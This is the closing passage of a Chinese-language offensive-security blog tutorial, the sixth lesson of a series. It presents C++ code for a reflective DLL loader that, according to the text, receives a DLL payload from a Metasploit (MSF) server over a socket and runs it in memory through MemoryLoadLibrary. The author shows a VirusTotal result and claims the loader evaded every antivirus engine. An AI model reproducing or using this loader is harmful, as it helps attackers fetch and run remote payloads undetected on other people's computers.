</span></span></span><span style=display:flex><span><span style=color:#75715e></span>DWORD <span style=color:#a6e22e>OpenBadCodeDLL</span>(HANDLE <span style=color:#f92672>&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
</span></span><span style=display:flex><span>	DWORD dwHighFileSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	DWORD dwLowFileSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 打开文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hBadCodeDll <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFile</span>(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(hBadCodeDll <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE){
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	dwLowFileSize <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetFileSize</span>(hBadCodeDll,<span style=color:#f92672>&amp;</span>dwHighFileSize);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> dwLowFileSize;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	HMEMORYMODULE hModule;
</span></span><span style=display:flex><span>	Module DllMain;
</span></span><span style=display:flex><span>	bFileBuffer <span style=color:#f92672>=</span> new BYTE[PAYLOAD_SIZE];
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>GetPEDLL</span>();
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 导入PE文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hModule <span style=color:#f92672>=</span> <span style=color:#a6e22e>MemoryLoadLibrary</span>(bFileBuffer);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 如果加载失败，就退出
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span>(hModule <span style=color:#f92672>==</span> NULL){
</span></span><span style=display:flex><span>		delete [] bFileBuffer;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 获取msg导出函数地址
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	DllMain <span style=color:#f92672>=</span> (Module)<span style=color:#a6e22e>MemoryGetProcAddress</span>(hModule,<span style=color:#e6db74>&#34;DllMain&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 运行msg函数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>DllMain</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 释放资源
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	DWORD dwThread;
</span></span><span style=display:flex><span>	HANDLE hThread <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateThread</span>(NULL,NULL,(LPTHREAD_START_ROUTINE)DllMain,NULL,NULL,<span style=color:#f92672>&amp;</span>dwThread);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>WaitForSingleObject</span>(hThread,INFINITE);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>MemoryFreeLibrary</span>(hModule);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 释放PE内存
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	delete [] bFileBuffer;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p><p>实现效果如下：</p><p><img src=https://images.payloads.online/82f319d8-4f5f-11ec-a688-00d861bf4abb.png alt=2020-01-03-13-07-19></p><h2 id=0x04-总结>0x04 总结</h2><p>注意：学习的过程中，不同位数要对应不同的payload，编译平台也要互相对应</p><p>第六课就到这里了，主要是引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p><p>老样子，V站查杀一下：</p><p><img src=https://images.payloads.online/832a3850-4f5f-11ec-86bb-00d861bf4abb.png alt=2020-01-03-13-07-29></p><p>挑战了全球的AV，全部通过</p><p><a href=https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection>https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection</a></p><p>所有的新技术，都离不开强大的基础知识的铺垫，通过积攒基础知识，使自己能挑战更多的"不可能"。</p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2020-01-25/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>2019年度总结随想</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2020-01-01/1/><span>Linux权限维持之LD_PRELOAD</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>